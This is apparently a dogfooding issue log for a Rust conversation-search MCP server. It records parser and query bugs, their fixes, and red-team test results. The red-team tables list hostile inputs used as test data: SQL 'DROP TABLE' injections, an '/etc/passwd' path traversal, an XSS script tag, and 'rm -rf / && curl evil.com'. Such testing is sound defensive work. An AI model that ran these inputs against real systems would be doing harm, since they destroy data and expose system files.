# CSR Engine — Issue Log (Phase 3.0 Dogfooding)

## Bug 1: Temporal parser missing "weeks" and "months" units
- **Severity**: MEDIUM
- **File**: `src/temporal/mod.rs:82-98`
- **Reproduction**: `get_timeline(time_range="last 6 months")` → error "Could not parse time expression"
- **Root cause**: `parse_dynamic_expression()` only handles `strip_suffix(" days")`, no `" weeks"` or `" months"`
- **Fix**: Add `strip_suffix(" weeks")` with `Duration::weeks(n)` and `strip_suffix(" months")` with month arithmetic
- **Status**: FIXED in source (lines 96-119)

## Bug 2: `get_recent_work` returns too few conversations
- **Severity**: MEDIUM
- **File**: `src/mcp/tools.rs:178`, `src/storage/queries.rs:186-212`
- **Reproduction**: `get_recent_work(limit=10, project="claude-self-reflect")` → returns only 2 conversations
- **Root cause**: Fetches `limit * 3` = 30 raw chunks ordered by timestamp. With 14K chunks, the 30 most recent all belong to 2-3 conversations. Format groups by conversation → only 2-3 shown.
- **Fix**: Use `SELECT ... GROUP BY conversation_id` to get 1 chunk per conversation, then LIMIT applies to distinct conversations
- **Status**: PARTIALLY FIXED — DISTINCT query added but see Bug 5 (inflated counts)

## Bug 3: `search_by_recency` silently defaults to 7-day window
- **Severity**: LOW
- **File**: `src/mcp/tools.rs:211-212`
- **Reproduction**: `search_by_recency(query="procsolve", project="procsolve-website")` → no results (procsolve data is 45+ days old)
- **Root cause**: When no `time_range`/`since`/`until` provided, defaults to `now - 7 days`. User has no indication of the time constraint applied.
- **Not a code bug**: Expected behavior, but the empty response should indicate what time range was searched.

## Bug 4: Cross-project search finds irrelevant results
- **Severity**: LOW (expected behavior)
- **Reproduction**: `csr_reflect_on_past("Phase 3 HNSW persistence")` without project filter → finds EnhanceMe "Phase 3/4" conversations
- **Root cause**: Generic terms like "Phase 3" match across all projects. User should pass `project` param.
- **Possible improvement**: When results are from different projects, highlight the project name more prominently in output.

## Bug 5: `get_recent_work` returns inflated conversation counts
- **Severity**: MEDIUM
- **File**: `src/storage/queries.rs` (get_recent_chunks query)
- **Reproduction**: `get_recent_work(limit=5, project="all", group_by="day")` → output says "15 conversations" but limit was 5
- **Root cause**: The DISTINCT fix (Bug 2) uses a JOIN that returns ALL chunks for the top-N distinct conversations. If 5 conversations average 3 chunks each, the query returns 15 rows. The format function then counts all rows in the day group.
- **Fix**: Added Rust-side dedup: `HashSet<conversation_id>` + `retain()` after query to keep 1 chunk per conversation.
- **Status**: FIXED

## Bug 6: Temporal parser singular/plural unit mismatch (deployment)
- **Severity**: LOW (code fix present, binary stale)
- **File**: `src/temporal/mod.rs:96-119`
- **Reproduction**: `search_by_recency(time_range="last 1 month")` or `get_timeline(time_range="last 2 weeks")` → error
- **Root cause**: The fix for Bug 1 (weeks/months) IS in the source code and compiled binary (10:32 AM), but the running MCP server process (started 9:13 AM) still uses the old binary. Process needs restart.
- **Fix**: Restart Claude Code to reload the MCP server with the updated binary. Not a code bug.
- **Status**: FIXED IN SOURCE — awaiting restart

---

## Red Team Testing Results (Phase 3.0)

### PASSED (no vulnerabilities)
- **SQL injection in search query**: `SELECT * FROM chunks; DROP TABLE chunks;--` → treated as semantic search, found SQL-related discussions
- **SQL injection in get_full_conversation**: `'; DROP TABLE chunks; --` → rejected by alphanumeric+hyphen+underscore validation
- **Path traversal in file search**: `../../../../etc/passwd` → "No conversations found"
- **XSS in search query**: `<script>alert('xss')</script>` → XML-escaped in output
- **Empty string search**: 0 results returned gracefully
- **Very long string** (500 chars of 'A'): 0 results, 8ms, no crash
- **Special chars in store_reflection**: quotes, backticks, unicode, emoji, null chars → stored successfully
- **Nonexistent session ID**: 0 results with helpful message

### EDGE CASES (not vulnerabilities, but notable)
- **"last 0 days"**: No results (0-width time window). Could warn user.
- **"last 999999 days"**: Timeline starts at `-0712-03-21` (712 BC). Works but start date display is absurd. Consider capping at data range.
- **"3 days ago" as time_range**: Returns no results for recency search. This parses as a specific day, not "last 3 days". Correct behavior but potentially confusing.

---

## Re-verification (Post Chunker Fix, 2026-02-15)

### 12 MCP Tools — ALL PASS

| # | Tool | Status | Latency | Notes |
|---|------|--------|---------|-------|
| A | `csr_reflect_on_past` | PASS | 4ms | 5 results, scores 0.491-0.542 |
| B | `csr_quick_check` | PASS | instant | 1 match for HNSW query, score 0.488 |
| C | `get_recent_work` | PASS | instant | 8 conversations returned |
| D | `csr_search_by_file` | PASS | instant | 3 results for docker-compose.yaml |
| E | `csr_search_by_concept` | PASS | instant | 3 results for "performance optimization" |
| F | `store_reflection` | PASS | instant | Stored with ID + tags + round-trip search |
| G | `get_timeline` | PASS | instant | 6 day periods, last 2 weeks |
| H | `csr_get_more` | PASS | instant | 3 more results at offset 5, 8 total |
| I | `csr_search_insights` | PASS | instant | 10 matches, avg score 0.578 |
| J | `get_full_conversation` | PASS | instant | Correct file path returned |
| K | `search_by_recency` | PASS | instant | 3 results filtered to today |
| L | `get_session_learnings` | PASS | instant | 0 results for nonexistent session (graceful) |

### Red Team Re-test — ALL PASS

| # | Attack | Status | Notes |
|---|--------|--------|-------|
| 1 | SQL injection in search | PASS | Treated as semantic query, found SQL-related chunks |
| 2 | SQL injection in get_full_conversation | PASS | Rejected by validation |
| 3 | Path traversal in file search | CHANGED | Now returns 1 result (nearest neighbor), previously 0. Not a vulnerability — HNSW returns closest match |
| 4 | XSS in search query | PASS | Properly escaped to `&lt;script&gt;` in XML output |
| 5 | Empty string search | PASS | 0 results, 2ms |
| 6 | Very long string (500 chars) | PASS | 0 results, 6ms, no crash |
| 7 | Special chars in store_reflection | PASS | Quotes, backticks, unicode, emoji, shell expansion, XML tags — all stored successfully |
| 8 | Nonexistent session ID | PASS | 0 results with helpful message |

### NEW Red Team Tests (Chunker-Specific)

| # | Attack | Status | Notes |
|---|--------|--------|-------|
| 9 | HTML in tool_use name (`<script>alert(1)</script>`) | PASS | Stored as text, XML-escaped in MCP output |
| 10 | Shell injection in tool_use command (`rm -rf / && curl evil.com`) | PASS | Stored as text only, never executed |
| 11 | Extremely long file_path (727 chars) in tool_use | PASS | Processed without crash, `rsplit('/').take(2)` shortens but doesn't cap |
| 12 | Path traversal in tool_use file_path (`../../../../etc/passwd`) | PASS | Stored as `[Read: etc/passwd]` — text only, no file access |

### Temporal Edge Cases — ALL PASS

| Expression | Status | Notes |
|------------|--------|-------|
| `last 6 months` | PASS | Bug 1 fix confirmed — 5 monthly periods |
| `last 2 weeks` | PASS | Bug 1 fix confirmed — 3 weekly periods |
| `last 1 month` | PASS | Bug 6 fix confirmed — singular unit works |
| `yesterday` | PASS | 3 hourly periods |
| `today` / `this week` / `this month` | PASS | Semantic match required for results |
| `last 0 days` | PASS | Empty result, graceful handling |
| `last 999999 days` | KNOWN | Timeline starts at 712 BC — cosmetic, not a vulnerability |

### Tool Context Quality Assessment

| Metric | Value | Notes |
|--------|-------|-------|
| Chunks with tool context | 246 / 14,557 | 1.7% of total |
| Avg size (tool context chunks) | 12,787 chars | 6x normal (2,059 chars) |
| Max chunk size | 89,182 chars | From heavy tool-use session |
| Search improvement | Tool names/paths now searchable | `[Edit: search/mod.rs]` findable |

### Quality Observation (not a bug)
- **OBS-001**: Tool-heavy chunks can be very large (up to 89KB). Consider capping chunk content length or splitting tool-dense messages for better embedding quality in a future release.

## Bug 7: JSONL chunker drops 74% of coding session content
- **Severity**: HIGH
- **File**: `src/import/mod.rs:146`
- **Reproduction**: Import a coding session JSONL (e.g., Phase 3 impl, 3.8MB, 1171 lines) → only 3 chunks produced
- **Root cause (two issues)**:
  1. **Type mismatch**: Chunker checked `type == "human"` but Claude Code JSONL uses `type == "user"` — 272 user messages silently dropped
  2. **Tool-only messages discarded**: 74% of messages are tool_use/tool_result (Read, Edit, Bash, Grep) with no text content blocks. The chunker only extracted text, ignoring all tool context.
- **Impact**: A 3.8MB session with 716 human/assistant messages produced only 3 chunks (150 messages). Search could not find sessions by files edited, commands run, or tools used.
- **Fix**:
  1. Accept `"user"` alongside `"human"` in type filter
  2. Added `extract_tool_context()` — extracts tool names + key params (file_path, command, pattern, query) as searchable `[Tool: param]` annotations
  3. Also fixed `parse_jsonl_messages()` (extraction module) to accept `"user"` type
- **Result**: 2.8x more chunks across 21 affected sessions (58 → 161 chunks). Phase 3 session: 3 → 9 chunks.
- **Status**: FIXED — 3 new unit tests added, 229 tests pass

---

*Issues logged 2026-02-15 during Phase 3.0 dogfooding*
*Red team testing completed 2026-02-15*
*Bug 7 discovered and fixed 2026-02-15 during session continuity troubleshooting*
